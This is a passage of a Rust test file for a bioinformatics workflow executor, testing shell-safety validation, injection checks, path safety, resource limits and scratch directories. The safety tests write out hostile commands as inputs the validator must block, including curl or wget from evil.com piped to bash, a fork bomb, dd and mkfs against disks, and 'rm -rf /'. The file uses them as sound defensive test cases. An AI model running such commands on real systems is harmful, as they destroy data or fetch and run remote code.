        validate_shell_safety("mkswap /dev/sda1").is_err(),
        "should block mkswap"
    );
}

#[test]
fn validate_shell_safety_blocks_dd_to_block_device() {
    assert!(
        validate_shell_safety("dd if=/dev/zero of=/dev/sda bs=1M").is_err(),
        "should block dd to block device"
    );
}

#[test]
fn validate_shell_safety_blocks_chmod_r_777() {
    assert!(
        validate_shell_safety("chmod -R 777 /").is_err(),
        "should block chmod -R 777 /"
    );
}

#[test]
fn validate_shell_safety_blocks_chmod_777_etc() {
    assert!(
        validate_shell_safety("chmod 777 /etc/passwd").is_err(),
        "should block chmod 777 /etc/passwd"
    );
}

#[test]
fn validate_shell_safety_blocks_wget_pipe_sh() {
    assert!(
        validate_shell_safety("wget -O- http://evil.com/script.sh | sh").is_err(),
        "should block wget pipe to sh"
    );
}

#[test]
fn validate_shell_safety_blocks_curl_pipe_bash() {
    assert!(
        validate_shell_safety("curl -s http://evil.com | bash").is_err(),
        "should block curl pipe to bash"
    );
}

#[test]
fn validate_shell_safety_blocks_curl_pipe_sudo() {
    assert!(
        validate_shell_safety("curl http://evil.com | sudo bash").is_err(),
        "should block curl pipe to sudo"
    );
}

#[test]
fn validate_shell_safety_blocks_block_device_write_redirect() {
    assert!(
        validate_shell_safety("echo test > /dev/sda").is_err(),
        "should block direct write to /dev/sda"
    );
}

#[test]
fn validate_shell_safety_blocks_block_device_append_redirect() {
    assert!(
        validate_shell_safety("echo test >> /dev/sdb1").is_err(),
        "should block append to /dev/sdb1"
    );
}

#[test]
fn validate_shell_safety_blocks_fork_bomb() {
    assert!(
        validate_shell_safety(":(){ :|:& };:").is_err(),
        "should block fork bomb"
    );
}

#[test]
fn validate_shell_safety_blocks_dd_from_dev_random() {
    assert!(
        validate_shell_safety("dd if=/dev/random of=output.dat bs=1024").is_err(),
        "should block dd from /dev/random"
    );
}

#[test]
fn validate_shell_safety_blocks_dd_from_dev_urandom() {
    assert!(
        validate_shell_safety("dd if=/dev/urandom of=output.bin bs=4096").is_err(),
        "should block dd from /dev/urandom"
    );
}

#[test]
fn validate_shell_safety_blocks_mkfs_plain() {
    assert!(
        validate_shell_safety("mkfs /dev/sda").is_err(),
        "should block plain mkfs"
    );
}

#[test]
fn validate_shell_safety_blocks_wget_pipe_dash() {
    assert!(
        validate_shell_safety("wget -qO- http://evil.net/payload | dash").is_err(),
        "should block wget pipe to dash"
    );
}

#[test]
fn validate_shell_safety_allows_rm_rf_relative_path() {
    assert!(
        validate_shell_safety("rm -rf output_dir/").is_ok(),
        "should allow rm -rf with relative path"
    );
}

#[test]
fn validate_shell_safety_allows_dd_normal_usage() {
    assert!(
        validate_shell_safety("dd if=input.fastq of=output.fastq bs=1M").is_ok(),
        "should allow normal dd usage"
    );
}

#[test]
fn validate_shell_safety_allows_bwa_mem() {
    assert!(
        validate_shell_safety("bwa mem ref.fa reads.fq > out.sam").is_ok(),
        "should allow bwa mem with redirect"
    );
}

#[test]
fn validate_shell_safety_allows_samtools_sort() {
    assert!(
        validate_shell_safety("samtools sort in.bam -o out.bam").is_ok(),
        "should allow samtools sort"
    );
}

#[test]
fn validate_shell_safety_allows_echo_hello() {
    assert!(
        validate_shell_safety("echo hello").is_ok(),
        "should allow echo hello"
    );
}

#[test]
fn validate_shell_safety_allows_fastp() {
    assert!(
        validate_shell_safety("fastp -i in.fq -o out.fq").is_ok(),
        "should allow fastp with pipes and flags"
    );
}

#[test]
fn validate_shell_safety_allows_pipe_chaining() {
    assert!(
        validate_shell_safety("cat reads.fq | fastp -o out.fq").is_ok(),
        "should allow pipe chaining (common bioinformatics idiom)"
    );
}

#[test]
fn validate_shell_safety_allows_semicolons() {
    assert!(
        validate_shell_safety("echo start; bwa mem ref.fa reads.fq > out.sam; echo done").is_ok(),
        "should allow semicolons (common bioinformatics idiom)"
    );
}

#[test]
fn validate_shell_safety_allows_double_ampersand() {
    assert!(
        validate_shell_safety("bwa index ref.fa && bwa mem ref.fa reads.fq > out.sam").is_ok(),
        "should allow && chaining"
    );
}

#[test]
fn validate_shell_safety_allows_rm_relative_without_root() {
    assert!(
        validate_shell_safety("rm -rf results/").is_ok(),
        "should allow rm -rf with non-root relative path"
    );
}

// ---------------------------------------------------------------------------
// sanitize_shell_command tests
// ---------------------------------------------------------------------------

#[test]
fn sanitize_shell_command_detects_command_substitution() {
    let warnings = sanitize_shell_command("echo $(whoami)");
    assert!(
        warnings
            .iter()
            .any(|w| w.contains("Command substitution detected")),
        "should warn on $()"
    );
}

#[test]
fn sanitize_shell_command_detects_backtick() {
    let warnings = sanitize_shell_command("echo `whoami`");
    assert!(
        warnings
            .iter()
            .any(|w| w.contains("Backtick command substitution detected")),
        "should warn on backticks"
    );
}

#[test]
fn sanitize_shell_command_detects_dev_redirect() {
    let warnings = sanitize_shell_command("echo test >/dev/null");
    assert!(
        warnings
            .iter()
            .any(|w| w.contains("Redirect to /dev/ detected")),
        "should warn on >/dev/ redirect"
    );
}

#[test]
fn sanitize_shell_command_detects_eval() {
    let warnings = sanitize_shell_command("eval echo hello");
    assert!(
        warnings.iter().any(|w| w.contains("eval usage detected")),
        "should warn on eval"
    );
}

#[test]
fn sanitize_shell_command_no_false_positives_simple_cmd() {
    let warnings = sanitize_shell_command("echo hello world");
    assert!(
        warnings.is_empty(),
        "should not warn on simple commands: {:?}",
        warnings
    );
}

#[test]
fn sanitize_shell_command_no_false_positives_bioinformatics() {
    let warnings = sanitize_shell_command("bwa mem ref.fa reads.fq > out.sam");
    assert!(
        warnings.is_empty(),
        "should not warn on bioinformatics commands: {:?}",
        warnings
    );
}

// ---------------------------------------------------------------------------
// validate_path_safety tests
// ---------------------------------------------------------------------------

#[test]
fn validate_path_safety_allows_relative_path() {
    let workdir = std::path::Path::new("/tmp/test-workflow");
    validate_path_safety(workdir, "results/output.txt").unwrap();
}

#[test]
fn validate_path_safety_allows_absolute_path_in_workdir() {
    let workdir = std::path::Path::new("/tmp/test-workflow");
    validate_path_safety(workdir, "/tmp/test-workflow/results/output.txt").unwrap();
}

#[test]
fn validate_path_safety_blocks_absolute_path_outside_workdir() {
    let workdir = std::path::Path::new("/tmp/test-workflow");
    let result = validate_path_safety(workdir, "/etc/passwd");
    assert!(
        result.is_err(),
        "should block absolute path outside workdir"
    );
}

#[test]
fn validate_path_safety_blocks_traversal() {
    let workdir = std::path::Path::new("/tmp/test-workflow");
    let result = validate_path_safety(workdir, "../escape/passwd");
    assert!(result.is_err(), "should block path traversal via '..'");
}

#[test]
fn validate_path_safety_allows_output_without_traversal() {
    let workdir = std::path::Path::new("/tmp/test-workflow");
    validate_path_safety(workdir, "results/{sample}_output.txt").unwrap();
}

// ---------------------------------------------------------------------------
// validate_interpreter_path tests
// ---------------------------------------------------------------------------

#[test]
fn validate_interpreter_path_allows_simple_name() {
    validate_interpreter_path("python3").unwrap();
}

#[test]
fn validate_interpreter_path_allows_safe_absolute_path() {
    validate_interpreter_path("/usr/bin/python3").unwrap();
}

#[test]
fn validate_interpreter_path_blocks_unsafe_absolute_path() {
    let result = validate_interpreter_path("/tmp/evil/python");
    assert!(
        result.is_err(),
        "should block absolute path not in safe directories"
    );
}

#[test]
fn validate_interpreter_path_blocks_traversal() {
    let result = validate_interpreter_path("../etc/shell");
    assert!(
        result.is_err(),
        "should block interpreter path with traversal"
    );
}

#[test]
fn validate_interpreter_path_allows_home_path() {
    validate_interpreter_path("/home/user/bin/python3").unwrap();
}

#[test]
fn validate_interpreter_path_allows_opt_path() {
    validate_interpreter_path("/opt/conda/bin/python3").unwrap();
}

// ---------------------------------------------------------------------------
// Additional wildcard injection tests
// ---------------------------------------------------------------------------

#[test]
fn validate_wildcard_injection_allows_config_keys() {
    let mut values = HashMap::<String, String>::new();
    values.insert("config.sample_name".to_string(), "$(whoami)".to_string());
    values.insert("sample".to_string(), "SAMPLE_01".to_string());
    // Config-prefixed keys should be skipped (trusted from .oxoflow file)
    validate_wildcard_injection(&values, &HashMap::new()).unwrap();
}

#[test]
fn validate_wildcard_injection_blocks_pipe_in_value() {
    let mut values = HashMap::<String, String>::new();
    values.insert("sample".to_string(), "SAMPLE_01 | echo hacked".to_string());
    // Issue #203 default charset: unconstrained wildcards reject shell
    // metacharacters outright (previously deferred to the rendered-command
    // scan; now fail fast at the value layer).
    assert!(validate_wildcard_injection(&values, &HashMap::new()).is_err());
}

#[test]
fn validate_wildcard_injection_blocks_backtick_in_value() {
    let mut values = HashMap::<String, String>::new();
    values.insert("sample".to_string(), "`evil`".to_string());
    let result = validate_wildcard_injection(&values, &HashMap::new());
    assert!(result.is_err(), "should block backtick in wildcard values");
}

#[test]
fn validate_wildcard_injection_blocks_subshell_in_value() {
    let mut values = HashMap::<String, String>::new();
    values.insert("sample".to_string(), "$(echo hacked)".to_string());
    let result = validate_wildcard_injection(&values, &HashMap::new());
    assert!(result.is_err(), "should block $() in wildcard values");
}

#[tokio::test]
async fn check_resources_fails_fast_when_group_exceeds_declared_capacity() {
    let config = ExecutorConfig {
        workdir: std::env::temp_dir(),
        resource_groups: HashMap::from([("gpu".to_string(), 1)]),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let mut rule = make_rule("gpu_job", "echo hi");
    rule.resources.groups = HashMap::from([("gpu".to_string(), 2)]);
    // Requirement (2) exceeds declared capacity (1): must fail immediately
    // instead of waiting forever in the resource-notify loop.
    let err = executor.check_resources(&rule).await.unwrap_err();
    match err {
        crate::OxoFlowError::ResourceGroupExhausted {
            group,
            required,
            available,
            ..
        } => {
            assert_eq!(group, "gpu");
            assert_eq!(required, 2);
            assert_eq!(available, 1);
        }
        other => panic!("expected ResourceGroupExhausted, got {other}"),
    }
}

#[tokio::test]
async fn check_resources_fails_fast_when_group_is_undeclared() {
    let config = ExecutorConfig {
        workdir: std::env::temp_dir(),
        resource_groups: HashMap::new(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let mut rule = make_rule("gpu_job", "echo hi");
    rule.resources.groups = HashMap::from([("gpu".to_string(), 1)]);
    // The workflow declares no [resource_groups]: the request can never be
    // satisfied, so it must fail fast with an actionable error.
    let err = executor.check_resources(&rule).await.unwrap_err();
    match err {
        crate::OxoFlowError::ResourceGroupExhausted { available, .. } => {
            assert_eq!(available, 0);
        }
        other => panic!("expected ResourceGroupExhausted, got {other}"),
    }
}

#[tokio::test]
async fn check_resources_clamps_requests_beyond_total_capacity() {
    // A small machine: 4 threads, 3.7GB. A rule asking for more (96 threads,
    // 72G — common in ports that copy upstream HPC labels) must still run:
    // the request is the tool's upper bound, not a scheduling requirement.
    // The pool math itself is covered by the scheduler's ResourcePool tests.
    let config = ExecutorConfig {
        workdir: std::env::temp_dir(),
        max_threads: Some(4),
        max_memory_mb: Some(3723),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let mut rule = make_rule("star_align", "echo hi");
    rule.resources.threads = 96;
    rule.resources.memory = Some("72G".to_string());

    executor.check_resources(&rule).await.unwrap();
}

#[tokio::test]
async fn force_rules_bypasses_freshness_skip() {
    let workdir = std::env::temp_dir().join(format!("oxo-force-test-{}", std::process::id()));
    let _ = tokio::fs::remove_dir_all(&workdir).await;
    tokio::fs::create_dir_all(&workdir).await.unwrap();

    // Output exists and is newer than the input → the mtime freshness gate
    // would normally skip the rule. force_rules must bypass it (issue #62:
    // checkpoint-invalidated rules must actually re-execute).
    tokio::fs::write(workdir.join("in.txt"), b"input")
        .await
        .unwrap();
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    tokio::fs::write(workdir.join("out.txt"), b"stale")
        .await
        .unwrap();

    let mut rule = make_rule("fresh_skip", "echo fresh > {output}");
    rule.input = FilePatterns::List(vec!["in.txt".to_string()]);
    rule.output = FilePatterns::List(vec!["out.txt".to_string()]);

    // Without force: freshness gate skips.
    let executor = LocalExecutor::new(ExecutorConfig {
        workdir: workdir.clone(),
        ..Default::default()
    });
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Skipped);
    assert_eq!(record.skip_reason.as_deref(), Some("outputs up-to-date"));

    // With force_rules: the rule re-executes and rewrites the output.
    let executor = LocalExecutor::new(ExecutorConfig {
        workdir: workdir.clone(),
        force_rules: std::collections::HashSet::from(["fresh_skip".to_string()]),
        ..Default::default()
    });
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    let content = tokio::fs::read_to_string(workdir.join("out.txt"))
        .await
        .unwrap();
    assert_eq!(content.trim(), "fresh");

    let _ = tokio::fs::remove_dir_all(&workdir).await;
}

// ── {log} placeholder (W004 was unwired: `2> {log}` created a literal
//    "{log}" file) ────────────────────────────────────────────────────────

#[test]
fn render_shell_log_placeholder() {
    let rule = Rule {
        name: "test".to_string(),
        output: vec!["out.txt".to_string()].into(),
        shell: None,
        log: Some("logs/run.log".to_string()),
        ..Default::default()
    };
    let result = render_shell_command("echo hi 2> {log}", &rule, &HashMap::new(), TEST_LIMITS);
    assert_eq!(result, "echo hi 2> logs/run.log");
}

#[test]
fn render_shell_log_indexed() {
    let rule = Rule {
        name: "test".to_string(),
        output: vec!["out.txt".to_string()].into(),
        log: Some("logs/run.log".to_string()),
        ..Default::default()
    };
    let result = render_shell_command("echo hi 2> {log[0]}", &rule, &HashMap::new(), TEST_LIMITS);
    assert_eq!(result, "echo hi 2> logs/run.log");
}

#[test]
fn render_shell_log_expands_sample_and_config() {
    let rule = Rule {
        name: "test".to_string(),
        output: vec!["out.txt".to_string()].into(),
        log: Some("logs/{sample}/{config.results_dir}/run.log".to_string()),
        ..Default::default()
    };
    let mut values = HashMap::new();
    values.insert("sample".to_string(), "S1".to_string());
    values.insert("config.results_dir".to_string(), "results".to_string());
    let result = render_shell_command("echo hi 2> {log}", &rule, &values, TEST_LIMITS);
    assert_eq!(result, "echo hi 2> logs/S1/results/run.log");
}

#[test]
fn render_shell_log_absent_keeps_placeholder() {
    let rule = Rule {
        name: "test".to_string(),
        output: vec!["out.txt".to_string()].into(),
        ..Default::default()
    };
    let result = render_shell_command("echo hi 2> {log}", &rule, &HashMap::new(), TEST_LIMITS);
    assert_eq!(result, "echo hi 2> {log}");
}

// ── array config values render space-joined, not as TOML literals ───────

#[test]
fn render_shell_config_array_joins_with_space() {
    let rule = Rule {
        name: "test".to_string(),
        output: vec!["out.txt".to_string()].into(),
        ..Default::default()
    };
    let mut values = HashMap::new();
    // The CLI stringifies TOML arrays exactly in this TOML-literal form.
    values.insert(
        "config.files".to_string(),
        "[\"a.fa\", \"b.fa\"]".to_string(),
    );
    let result = render_shell_command(
        "cat {config.files} > {output[0]}",
        &rule,
        &values,
        TEST_LIMITS,
    );
    assert_eq!(result, "cat a.fa b.fa > out.txt");
}

#[test]
fn render_shell_config_array_non_string_elements() {
    let rule = Rule {
        name: "test".to_string(),
        output: vec!["out.txt".to_string()].into(),
        ..Default::default()
    };
    let mut values = HashMap::new();
    values.insert("config.ids".to_string(), "[1, 2]".to_string());
    let result = render_shell_command("echo {config.ids}", &rule, &values, TEST_LIMITS);
    assert_eq!(result, "echo 1 2");
}

#[test]
fn render_shell_config_scalar_unchanged() {
    let rule = Rule {
        name: "test".to_string(),
        output: vec!["out.txt".to_string()].into(),
        ..Default::default()
    };
    let mut values = HashMap::new();
    // Scalars — including strings that happen to look like TOML — pass
    // through untouched (only array literals join).
    values.insert("config.reference".to_string(), "/data/ref.fa".to_string());
    values.insert("config.mode".to_string(), "1".to_string());
    let result = render_shell_command(
        "bwa mem {config.reference} {config.mode}",
        &rule,
        &values,
        TEST_LIMITS,
    );
    assert_eq!(result, "bwa mem /data/ref.fa 1");
}

// ── executor creates the log file's parent directory ────────────────────

#[tokio::test]
async fn execute_creates_log_parent_dir() {
    let workdir = std::env::temp_dir().join(format!("oxo-logdir-test-{}", std::process::id()));
    let _ = tokio::fs::remove_dir_all(&workdir).await;
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: workdir.clone(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = Rule {
        name: "log_dir_test".to_string(),
        input: vec![].into(),
        output: vec!["out/result.txt".to_string()].into(),
        shell: Some("echo done > {output[0]} 2> {log}".to_string()),
        log: Some("logs/sub/run.log".to_string()),
        ..Default::default()
    };
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    assert!(
        workdir.join("logs/sub/run.log").exists(),
        "log file should have been created"
    );
    let _ = tokio::fs::remove_dir_all(&workdir).await;
}

// ── bash -c executor ────────────────────────────────────────────────────

#[tokio::test]
async fn execute_bash_only_syntax_process_substitution() {
    let config = ExecutorConfig {
        max_jobs: 1,
        dry_run: false,
        workdir: std::env::temp_dir(),
        keep_going: false,
        retry_count: 0,
        timeout: None,
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    // Process substitution `<(…)` is bash-only — dash (and bash running as
    // sh) reject it with a syntax error.
    let rule = make_rule("bash_psubst", "cat <(echo bash_psubst_ok)");
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    let stdout = record.stdout.unwrap_or_default();
    assert!(stdout.contains("bash_psubst_ok"), "stdout was: {stdout}");
}

#[cfg(unix)]
#[tokio::test]
async fn spawn_rule_shell_falls_back_to_sh_when_bash_missing() {
    // A PATH containing only a marker `sh` (no bash anywhere) must fall
    // back to sh; the marker output proves which shell actually ran.
    let tmp = std::env::temp_dir().join(format!("oxo-nobash-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&tmp);
    std::fs::create_dir_all(&tmp).unwrap();
    std::fs::write(
        tmp.join("sh"),
        "#!/bin/sh\necho ran_through_fallback_shell\n",
    )
    .unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(tmp.join("sh"), std::fs::Permissions::from_mode(0o755)).unwrap();

    let envs = HashMap::from([("PATH".to_string(), tmp.to_string_lossy().into_owned())]);
    let child =
        super::process::spawn_rule_shell("echo fallback_ok", &std::env::temp_dir(), &envs).unwrap();
    let output = child.wait_with_output().await.unwrap();
    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
    assert!(
        stdout.contains("ran_through_fallback_shell"),
        "expected the sh fallback to run, stdout was: {stdout}"
    );
    let _ = std::fs::remove_dir_all(&tmp);
}

// ── rule-level scratch working directory ─────────────────────────────────

/// List entries under `<workdir>/.oxo-flow/scratch` (empty when the root
/// does not exist at all).
fn scratch_entries(workdir: &Path) -> Vec<PathBuf> {
    let root = workdir.join(".oxo-flow/scratch");
    match std::fs::read_dir(&root) {
        Ok(entries) => entries.filter_map(|e| e.ok().map(|e| e.path())).collect(),
        Err(_) => Vec::new(),
    }
}

#[test]
fn scratch_flag_defaults_false_and_parses_from_toml() {
    let plain: Rule =
        toml::from_str("name = \"t\"\nshell = \"true\"\noutput = [\"o.txt\"]").unwrap();
    assert!(!plain.scratch, "scratch must default to false");
    let enabled: Rule =
        toml::from_str("name = \"t\"\nscratch = true\nshell = \"true\"\noutput = [\"o.txt\"]")
            .unwrap();
    assert!(enabled.scratch);
}

#[tokio::test]
async fn scratch_rule_moves_outputs_back_and_cleans_up() {
    let workdir = tempfile::tempdir().unwrap();
    std::fs::write(workdir.path().join("in.txt"), "hello\n").unwrap();
    let config = ExecutorConfig {
        workdir: workdir.path().to_path_buf(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = Rule {
        name: "scratch_demo".to_string(),
        input: vec!["in.txt".to_string()].into(),
        output: vec!["out/data.txt".to_string()].into(),
        shell: Some("cat {input[0]} > {output[0]} && echo more >> {output[0]}".to_string()),
        scratch: true,
        ..Default::default()
    };
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    // The declared output was produced inside the scratch cwd and moved
    // back to its main-workdir location.
    let out = workdir.path().join("out/data.txt");
    assert!(out.exists(), "output must land in the main workdir");
    assert_eq!(std::fs::read_to_string(&out).unwrap(), "hello\nmore\n");
    // The relative input only exists in the main workdir — succeeding
    // proves {input[0]} was rendered as an absolute path into it.
    assert!(
        scratch_entries(workdir.path()).is_empty(),
        "scratch must be removed on success"
    );
}

#[tokio::test]
async fn scratch_rule_failing_pre_exec_leaves_no_empty_scratch_dir() {
    // A pre_exec hook that exits non-zero aborts the rule before the main
    // command spawns. The hook MAY have written diagnostics, so the dir is
    // preserved (with the failure) — but a pre_exec that never spawns (or
    // a shell that fails safety validation) must not leak an empty dir.
    let workdir = tempfile::tempdir().unwrap();
    let config = ExecutorConfig {
        workdir: workdir.path().to_path_buf(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = Rule {
        name: "scratch_prefail".to_string(),
        output: vec!["data.txt".to_string()].into(),
        pre_exec: Some("exit 3".to_string()),
        shell: Some("true".to_string()),
        scratch: true,
        ..Default::default()
    };
    let err = executor
        .execute_rule(&rule, &HashMap::new())
        .await
        .expect_err("pre_exec failure must fail the rule");
    let message = err.to_string();
    assert!(message.contains("pre_exec hook failed"), "{message}");
    assert!(
        message.contains(".oxo-flow/scratch"),
        "failure must name the preserved scratch dir: {message}"
    );
    // The hook ran (and exited 3) — the dir is preserved for debugging,
    // matching the documented lifecycle.
    assert_eq!(scratch_entries(workdir.path()).len(), 1);
}

#[tokio::test]
async fn scratch_rule_rejected_hook_leaves_no_scratch_dir() {
    // A pre_exec that fails shell-safety validation aborts before anything
    // runs — the empty scratch dir must be discarded, not leaked (the
    // "no leftover dirs on paths where the shell never started" contract).
    let workdir = tempfile::tempdir().unwrap();
    let config = ExecutorConfig {
        workdir: workdir.path().to_path_buf(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = Rule {
        name: "scratch_blocked".to_string(),
        output: vec!["data.txt".to_string()].into(),
        pre_exec: Some("rm -rf /".to_string()),
        shell: Some("true".to_string()),
        scratch: true,
        ..Default::default()
    };
    let err = executor
        .execute_rule(&rule, &HashMap::new())
        .await
        .expect_err("blocked pre_exec must fail the rule");
    assert!(err.to_string().contains("Shell command blocked"));
    assert!(
        scratch_entries(workdir.path()).is_empty(),
        "no empty scratch dir may survive a rejected hook"
    );
}

#[tokio::test]
async fn scratch_rule_preserves_scratch_on_failure() {
    let workdir = tempfile::tempdir().unwrap();
    let config = ExecutorConfig {
        workdir: workdir.path().to_path_buf(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = Rule {
        name: "scratch_fail".to_string(),
        output: vec!["data.txt".to_string()].into(),
        shell: Some("echo partial > data.txt && exit 1".to_string()),
        scratch: true,
        ..Default::default()
    };
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Failed);
    let stderr = record.stderr.unwrap_or_default();
    assert!(
        stderr.contains(".oxo-flow/scratch"),
        "failure must point at the preserved scratch dir, stderr: {stderr}"
    );
    let entries = scratch_entries(workdir.path());
    assert_eq!(entries.len(), 1, "scratch must be kept on failure");
    let partial = entries[0].join("data.txt");
    assert!(partial.exists(), "partial output must remain in scratch");
    assert_eq!(std::fs::read_to_string(&partial).unwrap(), "partial\n");
}

#[tokio::test]
async fn scratch_rule_missing_outputs_keeps_scratch_with_path_note() {
    let workdir = tempfile::tempdir().unwrap();
    let config = ExecutorConfig {
        workdir: workdir.path().to_path_buf(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = Rule {
        name: "scratch_noval".to_string(),
        output: vec!["data.txt".to_string()].into(),
        shell: Some("true".to_string()),
        scratch: true,
        ..Default::default()
    };
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Failed);
    let stderr = record.stderr.unwrap_or_default();
    assert!(stderr.contains("output validation failed"));
    assert!(
        stderr.contains(".oxo-flow/scratch"),
        "stderr must mention the preserved scratch dir: {stderr}"
    );
    assert_eq!(scratch_entries(workdir.path()).len(), 1);
}

#[tokio::test]
async fn scratch_rule_log_lands_in_main_workdir() {
    let workdir = tempfile::tempdir().unwrap();
    let config = ExecutorConfig {
        workdir: workdir.path().to_path_buf(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = Rule {
        name: "scratch_log".to_string(),
        output: vec!["data.txt".to_string()].into(),
        shell: Some("echo run > data.txt 2> {log}".to_string()),
        log: Some("logs/run.log".to_string()),
        scratch: true,
        ..Default::default()
    };
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    // {log} renders absolute so the log survives scratch cleanup.
    assert!(workdir.path().join("logs/run.log").exists());
    assert!(workdir.path().join("data.txt").exists());
    assert!(scratch_entries(workdir.path()).is_empty());
}

#[tokio::test]
async fn scratch_rule_skips_when_outputs_fresh_without_scratch() {
    let workdir = tempfile::tempdir().unwrap();
    let config = ExecutorConfig {
        workdir: workdir.path().to_path_buf(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = Rule {
        name: "scratch_fresh".to_string(),
        output: vec!["data.txt".to_string()].into(),
        shell: Some("echo x > data.txt".to_string()),
        scratch: true,
        ..Default::default()
    };
    let first = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(first.status, JobStatus::Success);
    assert!(workdir.path().join("data.txt").exists());
    let second = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(second.status, JobStatus::Skipped);
    assert!(
        scratch_entries(workdir.path()).is_empty(),
        "a fresh-skip must not create scratch dirs"
    );
}

#[tokio::test]
async fn non_scratch_rule_never_creates_scratch() {
    let workdir = tempfile::tempdir().unwrap();
    let config = ExecutorConfig {
        workdir: workdir.path().to_path_buf(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = Rule {
        name: "plain_demo".to_string(),
        output: vec!["data.txt".to_string()].into(),
        shell: Some("echo x > data.txt".to_string()),
        scratch: false,
        ..Default::default()
    };
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    assert!(workdir.path().join("data.txt").exists());
    assert!(
        scratch_entries(workdir.path()).is_empty(),
        "non-scratch rules must never create scratch dirs"
    );
}

#[test]
fn scratch_render_inputs_absolute_outputs_relative() {
    let rule = Rule {
        name: "r".to_string(),
        input: vec!["reads/{sample}.fq".to_string()].into(),
        output: vec!["out/{sample}.sam".to_string()].into(),
        ..Default::default()
    };
    let mut values = HashMap::new();
    values.insert("sample".to_string(), "S1".to_string());
    let rendered = render_shell_command_in_scratch(
        "bwa mem {input[0]} > {output[0]}",
        &rule,
        &values,
        Path::new("/data/work"),
        TEST_LIMITS,
    );
    assert_eq!(rendered, "bwa mem /data/work/reads/S1.fq > out/S1.sam");
    // Non-scratch rendering keeps relative input paths.
    let plain = render_shell_command(
        "bwa mem {input[0]} > {output[0]}",
        &rule,
        &values,
        TEST_LIMITS,
    );
    assert_eq!(plain, "bwa mem reads/S1.fq > out/S1.sam");
}

#[test]
fn scratch_docker_wrapper_mounts_scratch_and_switches_cwd() {
    let workdir = Path::new("/data/work");
    let scratch = Path::new("/data/work/.oxo-flow/scratch/demo-1-0");
    let wrapped = "docker run --rm --user $(id -u):$(id -g) -v /data/work:/data/work -w /data/work ubuntu:24.04 sh -c 'bwa mem reads.fq > data.txt'";
    let fixed = fixup_container_wrapper(wrapped, "docker", workdir, scratch);
    assert!(
        fixed.contains(
            "-v /data/work:/data/work -v /data/work/.oxo-flow/scratch/demo-1-0:/data/work/.oxo-flow/scratch/demo-1-0"
        ),
        "fixed: {fixed}"
    );
    assert!(
        fixed.contains("-w /data/work/.oxo-flow/scratch/demo-1-0"),
        "fixed: {fixed}"
    );
    // The user command is never rewritten.
    assert!(fixed.ends_with("sh -c 'bwa mem reads.fq > data.txt'"));
}

#[test]
fn scratch_singularity_wrapper_adds_scratch_bind() {
    let workdir = Path::new("/data/work");
    let scratch = Path::new("/data/work/.oxo-flow/scratch/demo-1-0");
    let wrapped = "singularity exec --bind /data/work:/data/work ubuntu.sif sh -c 'bwa mem reads.fq > data.txt'";
    let fixed = fixup_container_wrapper(wrapped, "singularity", workdir, scratch);
    assert!(
        fixed.contains(
            "--bind /data/work:/data/work --bind /data/work/.oxo-flow/scratch/demo-1-0:/data/work/.oxo-flow/scratch/demo-1-0"
        ),
        "fixed: {fixed}"
    );
    assert!(fixed.ends_with("sh -c 'bwa mem reads.fq > data.txt'"));
}

#[test]
fn scratch_wrapper_fixup_leaves_host_wrappers_untouched() {
    let wrapped = "conda run -n bio bash -c 'bwa mem reads.fq > data.txt'";
    let fixed = fixup_container_wrapper(
        wrapped,
        "conda",
        Path::new("/data/work"),
        Path::new("/data/work/.oxo-flow/scratch/demo"),
    );
    assert_eq!(fixed, wrapped);
}

#[tokio::test]
async fn scratch_rule_pre_exec_runs_in_scratch_with_absolute_inputs() {
    let workdir = tempfile::tempdir().unwrap();
    std::fs::write(workdir.path().join("in.txt"), "hi\n").unwrap();
    let config = ExecutorConfig {
        workdir: workdir.path().to_path_buf(),
        ..Default::default()
    };
    let executor = LocalExecutor::new(config);
    let rule = Rule {
        name: "scratch_pre".to_string(),
        input: vec!["in.txt".to_string()].into(),
        output: vec!["data.txt".to_string()].into(),
        shell: Some("cat {input[0]} > {output[0]}".to_string()),
        // `test -f {input[0]}` only passes when the input renders absolute
        // (the file lives in the main workdir, the cwd is the scratch).
        pre_exec: Some("test -f {input[0]}".to_string()),
        scratch: true,
        ..Default::default()
    };
    let record = executor.execute_rule(&rule, &HashMap::new()).await.unwrap();
    assert_eq!(record.status, JobStatus::Success);
    assert!(workdir.path().join("data.txt").exists());
    assert!(scratch_entries(workdir.path()).is_empty());
}

